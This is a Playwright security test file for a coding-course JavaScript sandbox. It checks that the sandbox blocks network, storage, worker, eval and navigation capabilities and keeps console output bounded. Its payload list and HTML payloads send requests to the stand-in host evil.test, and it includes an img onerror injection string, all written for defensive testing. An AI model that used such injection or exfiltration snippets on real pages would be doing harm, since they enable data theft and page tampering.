import { expect, test, type Page } from '@playwright/test';
import { readFile } from 'node:fs/promises';
import type { JavaScriptRunnerAdapter as JavaScriptRunnerAdapterType } from '../../src/adapters/runtime/javascript';
import type { RunnerConsoleRecord, RunnerDiagnostic } from '../../src/core/runtime/contracts';
import {
  JAVASCRIPT_SOLUTION_SOURCE,
  openEditableJavaScriptExercise,
} from './helpers/javascriptCourse';
import {
  observeStableTopUrl,
  observeRuntimePage,
  readRuntimeErrors,
} from './helpers/openRuntimeFixture';
import { editorText, replaceEditorText, waitForStoredDraftContent } from './helpers/progress';
import { testServerUrl } from './helpers/testBasePath';

const capabilityPayloads = [
  ['fetch', "fetch('https://evil.test/fetch');"],
  ['XMLHttpRequest', "new XMLHttpRequest().open('GET', 'https://evil.test/xhr');"],
  ['WebSocket', "new WebSocket('wss://evil.test/socket');"],
  ['Beacon', "navigator.sendBeacon('https://evil.test/beacon', 'x');"],
  ['image', "new Image().src = 'https://evil.test/image.png';"],
  [
    'form insertion',
    `document.querySelector('body').innerHTML = '<form action="https://evil.test/form"></form>';`,
  ],
  ['popup', "open('https://evil.test/popup');"],
  ['top/parent', "self.parent.postMessage('forged', '*');"],
  ['Storage', "localStorage.setItem('tsumucode-security-canary', 'pwned');"],
  ['Worker', "new Worker('https://evil.test/worker.js');"],
  ['Service Worker', "navigator.serviceWorker.register('https://evil.test/sw.js');"],
  ['eval', "eval('console.log(1)');"],
  ['Function constructor', "Function('return 1')();"],
  ['dynamic import', "import('https://evil.test/module.js');"],
  ['self navigation', "window.location = 'https://evil.test/navigation';"],
] as const;

interface JavaScriptHarnessInput {
  readonly source: string;
  readonly capabilityProfile: 'core' | 'project';
}

interface JavaScriptHarnessResult {
  readonly diagnostics: readonly RunnerDiagnostic[];
  readonly console: readonly RunnerConsoleRecord[];
}

/** build済みVite manifestから、pageと同一originのJavaScript Runner entryを解決する。 */
async function loadJavaScriptRunnerModulePath(): Promise<string> {
  const manifest = JSON.parse(await readFile('dist/.vite/manifest.json', 'utf8')) as Readonly<
    Record<string, { readonly file?: unknown }>
  >;
  const file = manifest['src/adapters/runtime/javascript/index.ts']?.file;
  if (typeof file !== 'string')
    throw new Error('JavaScript Runner entryがVite manifestにありません');
  return new URL(file, testServerUrl(4173)).href;
}

/** 実Analyzerとopaque iframe Runnerへ任意ProfileのSourceを渡し、公開結果だけを返す。 */
async function runJavaScriptHarness(
  page: Page,
  input: JavaScriptHarnessInput,
): Promise<JavaScriptHarnessResult> {
  const runnerModulePath = await loadJavaScriptRunnerModulePath();
  return page.evaluate<
    JavaScriptHarnessResult,
    { readonly input: JavaScriptHarnessInput; readonly runnerModulePath: string }
  >(
    async ({ input: harnessInput, runnerModulePath }) => {
      const { JavaScriptRunnerAdapter } = (await import(/* @vite-ignore */ runnerModulePath)) as {
        readonly JavaScriptRunnerAdapter: typeof JavaScriptRunnerAdapterType;
      };
      const harnessWindow = window as typeof window & {
        __tsumucodeJavaScriptSecurityHarness?: {
          readonly runner: InstanceType<typeof JavaScriptRunnerAdapter>;
          readonly frame: HTMLIFrameElement;
        };
      };
      if (harnessWindow.__tsumucodeJavaScriptSecurityHarness === undefined) {
        const runner = new JavaScriptRunnerAdapter();
        const frame = document.createElement('iframe');
        frame.style.position = 'fixed';
        frame.style.inset = '0';
        frame.style.opacity = '0';
        frame.style.pointerEvents = 'none';
        document.body.append(frame);
        await runner.prepare(frame);
        harnessWindow.__tsumucodeJavaScriptSecurityHarness = { runner, frame };
      }
      const { runner } = harnessWindow.__tsumucodeJavaScriptSecurityHarness;
      const result = await runner.render({
        exerciseSessionId: crypto.randomUUID(),
        executionRevision: 1,
        languageId: 'javascript',
        files: {
          'index.html':
            '<!doctype html><html lang="ja"><body><h1 id="message">安全</h1></body></html>',
          'styles.css': '',
          'script.js': harnessInput.source,
        },
        assets: [],
        viewport: { id: 'desktop', width: 1280, height: 720 },
        options: {
          runtime: {
            kind: 'javascript',
            entryFile: 'script.js',
            sourceType: 'script',
            capabilityProfile: harnessInput.capabilityProfile,
            primaryOutput: 'console',
          },
        },
      });
      return { diagnostics: result.diagnostics, console: result.console };
    },
    {
      input,
      runnerModulePath,
    },
  );
}

/** Security E2Eで共有したRunner、Worker、iframeをtestごとに解放する。 */
async function disposeJavaScriptHarness(page: Page): Promise<void> {
  await page.evaluate(async () => {
    const harnessWindow = window as typeof window & {
      __tsumucodeJavaScriptSecurityHarness?: {
        readonly runner: { dispose(): Promise<void> };
        readonly frame: HTMLIFrameElement;
      };
    };
    const harness = harnessWindow.__tsumucodeJavaScriptSecurityHarness;
    if (harness === undefined) return;
    delete harnessWindow.__tsumucodeJavaScriptSecurityHarness;
    await harness.runner.dispose();
    harness.frame.remove();
  });
}

/** 選択中Fileを書き換え、同じ内容がIndexedDBへ保存されるまで待つ。 */
async function replaceAndSave(page: Page, source: string): Promise<void> {
  await replaceEditorText(page, source);
  await waitForStoredDraftContent(page, source);
}

test.beforeEach(async ({ page }) => {
  await observeRuntimePage(page);
  await openEditableJavaScriptExercise(page);
});

test.afterEach(async ({ page }) => {
  await disposeJavaScriptHarness(page);
  await expect(readRuntimeErrors(page)).resolves.toEqual({
    pageErrors: [],
    unhandledRejections: [],
    consoleErrors: [],
  });
});

test('bounded Consoleが循環・深さ・collection・getter・Proxy・HTML文字列をplain textへ閉じ込める', async ({
  page,
}) => {
  const result = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: `const cyclic = {};
cyclic.self = cyclic;
const deep = { a: { b: { c: { d: 'too deep' } } } };
const collection = Array.from({ length: 51 }, (_, index) => index);
const throwingGetter = { get value() { throw 'getter-called'; } };
const proxy = Proxy.revocable({}, { ownKeys() { throw 'proxy-called'; } }).proxy;
console.log(cyclic);
console.log(deep);
console.log(collection);
console.log(throwingGetter);
console.log(proxy);
console.log('<img src=x onerror="document.body.dataset.pwned=1">');`,
  });

  expect(result.diagnostics).toEqual([]);
  expect(result.console).toHaveLength(6);
  expect(result.console[0]?.text).toContain('[Circular]');
  expect(result.console[1]?.text).toContain('…');
  expect(result.console[2]?.text).toContain('…');
  expect(result.console[3]?.text).toContain('[Unreadable]');
  expect(result.console[4]?.text).toContain('[Unreadable]');
  expect(result.console[5]?.text).toContain('<img src=x onerror=');
  await expect(page.locator('img[src="x"]')).toHaveCount(0);
  expect(await page.evaluate(() => document.body.dataset['pwned'] ?? null)).toBeNull();
});

test('Console floodと64KiB超をboundedに切り、runtime error前の記録を残して再試行できる', async ({
  page,
}) => {
  const flood = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: 'for (let index = 0; index < 101; index += 1) console.log(index);',
  });
  expect(flood.diagnostics).toEqual([]);
  expect(flood.console).toHaveLength(100);
  expect(flood.console.at(-1)).toMatchObject({
    level: 'warn',
    text: 'Console output limit reached',
  });

  const totalLimit = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "for (let index = 0; index < 30; index += 1) console.log('😀'.repeat(1024));",
  });
  expect(totalLimit.diagnostics).toEqual([]);
  expect(
    totalLimit.console.reduce((bytes, record) => bytes + Buffer.byteLength(record.text), 0),
  ).toBeLessThanOrEqual(64 * 1024);
  expect(totalLimit.console.length).toBeLessThan(30);
  expect(totalLimit.console.at(-1)).toMatchObject({
    level: 'warn',
    text: 'Console output limit reached',
  });

  const runtimeError = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "console.log('before-error'); throw 'boom';",
  });
  expect(runtimeError.console.map(({ text }) => text)).toEqual(['before-error']);
  expect(runtimeError.diagnostics).toEqual([
    expect.objectContaining({ code: 'javascript-runtime', severity: 'error' }),
  ]);

  const retried = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "console.log('retry-ok');",
  });
  expect(retried.diagnostics).toEqual([]);
  expect(retried.console.map(({ text }) => text)).toEqual(['retry-ok']);
});

test('coreとprojectの両Profileで危険Capabilityをcode-errorとして拒否する', async ({ page }) => {
  for (const capabilityProfile of ['core', 'project'] as const) {
    for (const [name, source] of capabilityPayloads) {
      await test.step(`${capabilityProfile}: ${name}`, async () => {
        const result = await runJavaScriptHarness(page, { capabilityProfile, source });
        expect(result.console, `${capabilityProfile}/${name}`).toEqual([]);
        expect(result.diagnostics, `${capabilityProfile}/${name}`).toEqual([
          expect.objectContaining({ kind: 'security', severity: 'error' }),
        ]);
        expect(
          result.diagnostics.some(({ kind }) => kind === 'system'),
          `${capabilityProfile}/${name}をsystem-errorへ変換しない`,
        ).toBe(false);
      });
    }
  }
});

test('ConsoleのHTML風文字列をElement化せず、親DOMと外部通信を変更しない', async ({ page }) => {
  const externalRequests: string[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  await page.evaluate(() => {
    delete document.body.dataset['consolePwned'];
  });
  const source = `console.log('<img src="https://evil.test/x" onerror="document.body.dataset.consolePwned=1">');
document.querySelector('#message').textContent = 'JavaScriptで文字を変えました';`;
  await replaceAndSave(page, source);
  const update = page.getByRole('button', { name: 'プレビューを更新' });
  await update.click();
  await expect(update).toBeEnabled();
  await page.getByRole('tab', { name: 'Console' }).click();
  const consoleRegion = page.getByRole('region', { name: 'Console出力' });
  await expect(consoleRegion).toContainText('<img src="https://evil.test/x"');
  await expect(consoleRegion.locator('img')).toHaveCount(0);
  expect(await page.evaluate(() => document.body.dataset['consolePwned'] ?? null)).toBeNull();
  expect(externalRequests).toEqual([]);
});

test('JavaScript Capability payloadをfail-closedで拒否し、親画面と外部通信を守る', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  await page.evaluate(() => {
    document.body.dataset.javascriptSecurityCanary = 'intact';
    localStorage.setItem('tsumucode-security-canary', 'intact');
  });

  try {
    for (const [name, source] of capabilityPayloads) {
      await test.step(name, async () => {
        await replaceAndSave(page, source);
        const update = page.getByRole('button', { name: 'プレビューを更新' });
        await update.click();
        await expect(update).toBeEnabled();
        await expect(page.getByRole('list', { name: 'コード診断' })).toBeVisible();
        await expect.poll(() => editorText(page)).toBe(source);
        expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
        expect(
          await page.evaluate(() => ({
            canary: document.body.dataset.javascriptSecurityCanary ?? null,
            storage: localStorage.getItem('tsumucode-security-canary'),
          })),
        ).toEqual({ canary: 'intact', storage: 'intact' });
        expect(externalRequests, `${name}から外部requestを発生させない`).toEqual([]);
        expect(popups, `${name}からpopupを開かない`).toEqual([]);
      });
    }

    await page.evaluate(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          source: window,
          data: {
            version: 1,
            type: 'javascript.execution-complete',
            exerciseSessionId: 'forged-session',
            executionRevision: 999,
            requestId: 'execution',
            oneTimeToken: 'stale-token',
            payload: {
              executed: true,
              budgetExhausted: false,
              timerLimitExceeded: false,
              runtimeError: null,
            },
          },
        }),
      );
    });
    expect(page.url()).toBe(originalUrl);

    await replaceAndSave(page, JAVASCRIPT_SOLUTION_SOURCE);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    await expect(
      page
        .getByTestId('runtime-preview-frame')
        .locator('iframe')
        .contentFrame()
        .getByRole('heading', { name: 'JavaScriptで文字を変えました' }),
    ).toBeVisible();
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});

test('HTMLの外部image・form・popup導線を除き、script.jsだけを安全な別経路で実行する', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  const htmlPayload = `<!doctype html>
<html lang="ja">
  <body>
    <main><h1 id="message">安全</h1></main>
    <img src="https://evil.test/image.png" alt="外部画像">
    <form action="https://evil.test/form" method="post">
      <button formaction="https://evil.test/override">送信</button>
    </form>
    <a href="https://evil.test/popup" target="_blank">外部Link</a>
    <script src="script.js"></script>
  </body>
</html>`;

  try {
    await page.getByRole('tab', { name: 'index.html', exact: true }).click();
    await replaceAndSave(page, htmlPayload);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    const frame = page.getByTestId('runtime-preview-frame').locator('iframe').contentFrame();
    await expect(frame.getByRole('heading', { name: 'ここを書き換えます' })).toBeVisible();
    await expect(frame.getByRole('img', { name: '外部画像' })).not.toHaveAttribute('src');
    await expect(frame.locator('form')).not.toHaveAttribute('action');
    await expect(frame.locator('form')).not.toHaveAttribute('method');
    await expect(frame.getByRole('button', { name: '送信' })).not.toHaveAttribute('formaction');
    await expect(frame.getByRole('link', { name: '外部Link' })).not.toHaveAttribute('target');
    expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
    expect(externalRequests).toEqual([]);
    expect(popups).toEqual([]);
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});
